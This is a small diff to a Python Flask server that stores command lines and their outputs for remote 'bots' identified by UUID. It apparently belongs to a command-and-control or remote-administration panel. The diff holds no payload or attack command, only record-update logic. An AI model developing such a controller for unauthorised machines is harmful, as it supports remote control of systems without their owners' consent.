@@ -105,7 +105,7 @@ def push_command(uuid):
 
 	requests_data = request.get_json()
 
-	cmd = Command(bot_uuid=uuid, line=requests_data["line"])
+	cmd = Command(bot_uuid=uuid, line=requests_data["line"], output=requests_data["output"])
 
 	try: 
 
@@ -142,7 +142,13 @@ def update_output_from_command(uuid):
 
 	cmd = bot.commands.order_by(Command.timestamp.desc()).first()
 
-	cmd.output = requests_data["output"]
+	if requests_data.get("line"):
+
+		cmd.line = requests_data["line"]
+	
+	if requests_data.get("output"):
+
+		cmd.output = requests_data["output"]
 
 	try: 
 
